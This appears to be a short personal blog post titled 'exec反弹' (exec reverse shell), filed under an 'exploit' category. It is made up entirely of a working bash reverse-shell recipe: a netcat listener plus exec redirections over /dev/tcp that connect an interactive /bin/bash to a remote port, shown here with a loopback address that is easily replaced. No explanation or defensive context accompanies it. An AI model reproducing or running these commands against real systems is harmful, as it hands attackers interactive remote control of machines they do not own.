title: "exec反弹"
date: 2015-02-09 12:36:00
tags:
id: 769
comment: false
categories:
  - exploit
---

<pre class="brush:cpp">nc -lvvvp 4444
exec &lt;&gt; /dev/tcp/127.0.0.1/4444;
exec 9&lt;&gt; /dev/tcp/127.0.0.1/4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i</pre>